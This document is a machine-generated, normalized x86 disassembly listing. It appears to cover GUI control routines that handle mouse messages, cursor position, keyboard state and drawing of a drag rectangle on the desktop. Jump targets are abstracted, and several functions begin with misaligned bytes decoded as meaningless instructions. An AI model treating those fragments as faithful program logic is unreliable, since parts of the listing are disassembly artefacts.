movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442953
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_421d14
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44295a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44298c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4418a8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4038bc
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4038bc
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4038bc
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4038bc
jmp r-xdata
sub_442a7c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_414b3c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_442f64
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_441cf4
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_441d08
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_414b8c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_442c5c
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44187c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4038bc
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_448484
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f490
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_442c47
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_448484
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_448484
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_441704
test esi esi
je r-xdata
sub_442c5c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4038bc
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_443ae4
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4038bc
mov eax esi
call sub_4417ac
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_441768
mov ecx eax
xor edx edx
xor eax eax
call sub_414b64
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4038bc
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_442d00
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_442d30
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_442d9c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_442e5c
sub_442dcc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_442dfc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4418a8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_442e28
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_442e5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_442f30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_442f64
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_442ffc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4592cc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4592cc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_441904
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xec ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_462918
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4038bc
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_4591f0
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4038bc
jmp r-xdata
sub_443194
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4091e8
mov edi eax
mov eax [ esi + 0x64 ]
call sub_409214
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_441904
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_409020
call sub_408f90
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408f90
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44323c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44326c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_443230
push ebp
call sub_44323c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4432bc
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_443348
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_443380
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_442dfc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_459160
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4038bc
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_459160
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4038bc
sub_443404
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4418d4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_441f9c
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_443380
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_443450
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4418d4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44346c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4418d4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_441f9c
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443380
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4038bc
sub_4434c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_442d9c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_442d30
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_442d9c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_443560
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_443380
pop esi
pop ebx
retn
sub_443585
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_443380
pop esi
pop ebx
retn
sub_4435ab
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_443380
pop esi
pop ebx
retn
sub_4435d5
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_443380
pop esi
pop ebx
retn
sub_443600
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_443630
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_442dfc
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_459160
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4038bc
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_459160
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4038bc
sub_4436a8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4436e0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_459160
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4038bc
sub_443718
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_441f9c
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4436e0
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_407494
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4038bc
sub_443790
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4436e0
pop esi
pop ebx
retn
sub_4437b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4436e0
pop esi
pop ebx
retn
sub_4437d0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_459160
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4038bc
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44ccd0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443828
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_441f8c
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_441f9c
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_442f30
pop esi
retn
sub_443868
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
